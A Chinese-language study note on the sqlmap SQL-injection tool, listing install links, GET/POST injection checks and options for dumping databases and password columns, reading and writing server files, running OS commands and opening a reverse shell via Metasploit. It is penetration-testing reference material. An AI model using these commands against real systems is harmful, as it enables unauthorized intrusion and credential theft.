## sqlmap使用学习

- [连接](https://www.kancloud.cn/lengyueguang/linux/1257683)

---

#### 安装

- sqlmap需要python环境
  - [python下载](https://www.python.org/downloads/)
- sqlmap下载
  - [官方网站](http://sqlmap.org/)
  - [git clone](https://github.com/sqlmapproject/sqlmap.git)

---

#### 使用方式

- 博客教程
  - [详细教程1](https://blog.csdn.net/wn314/article/details/78872828)
  - [详细教程2](https://www.cnblogs.com/hongfei/p/3872156.html)
  - [详细教程3](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

- 判断是否存在get请求sql注入
  ```sh
  sqlmap.py -u “http://192.168.1.1/get_int.php？id=xxx" 
  ```

- 判断是否存在post请求方式注入

  - 将post请求包保存到文本中

  ```sh
  sqlmap.py -r "文本路径" 
  --dbs  //数据库
  --current-db //当前数据库
  --tables //表名
  --columns //行
  --dump 
  ```


---

#### 参数

- --batch 不要用户输入 

- -u 指定url

- --data='{a:1}' 字符串通过post发送

- --cookie=cookie 指定 http cookie

- --random-agent 随机选择 user-agent

- --proxy=xxx 用代理去连接目标

- --tor 使用匿名网络

- --check-tor 检测tor是否使用正确

- --dbs 列出数据库名称

- -D 指定数据库名称 

- --tables 列出表名

- -T 指定表名 -T table_xx

- --columns 列出字段名称

- -C 指定字段名称 -C columns_xx

- --dump 列出指定列的内容

  ```sh
  python3 sqlmap.py -u "http://127.0.0.1:9987/sql?tta=1" -D db_stopic -T tb_person -C name,pwd --dump
  ```

- -p指定测试参数 -p "page,id"

- --current-user 获取当前用户名称

- --current-db 获取当前数据库名称

- --users 列出所有用户

- --dump-all 列出所有数据库所有表

- --dbms 指定数据库

- --is 指定系统

- --sql-shell 执行指定sql命令

- --sql-query执行执行的sql语句

- --file-read 读取指定文件

- --file-write 写入本地文件

- --file-dest 要写入的文件绝对路径

  ```sh
  -–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt
  ```

- --os-cmd=whoami 命令执行(但是好像有点问题)

- --os-pwn 反弹shell shell(–os-pwn –msf-path=/opt/framework/msf3/) 

- –msf-path=  #matesploit绝对路径(–msf-path=/opt/framework/msf3/)